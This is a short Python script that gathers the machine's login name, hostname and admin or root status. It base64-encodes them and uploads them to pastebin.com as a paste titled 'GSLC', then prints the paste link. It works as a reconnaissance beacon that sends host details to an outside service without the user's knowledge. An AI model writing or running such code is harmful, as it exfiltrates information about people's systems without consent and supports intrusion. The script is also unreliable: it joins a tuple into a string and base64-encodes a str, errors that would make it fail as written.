import requests # see https://2.python-requests.org/en/master/
import os
import socket
import base64
 
def has_admin():
    import os
    if os.name == 'nt':
        try:
            # only windows users with admin privileges can read the C:\windows\temp
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
        except:
            return (os.environ['USERNAME'],False)
        else:
            return (os.environ['USERNAME'],True)
    else:
        if 'SUDO_USER' in os.environ and os.geteuid() == 0:
            return (os.environ['SUDO_USER'],True)
        else:
            return (os.environ['USERNAME'],False)
         
key = 'your_dev_key_here'
text = "a text"
t_title = "a_paste_title"

username = os.getlogin()
hostname = socket.gethostname()
privilage = has_admin()

data = username + " " +  hostname + " " + privilage
encodedData = base64.b64encode(data)

data = {
    'api_option': 'paste',
    'api_dev_key':key,
    'api_paste_code':encodedData,
    'api_paste_name':"GSLC",
    'api_paste_expire_date': 'see_https://pastebin.com/api',
    'api_user_key': None,
    'api_paste_format': 'see_https://pastebin.com/api'
    }
 
r = requests.post("https://pastebin.com/api/api_post.php", data=data)

print("Paste send: ", r.status_code if r.status_code != 200 else "OK/200")
print("Paste URL: ", r.text)

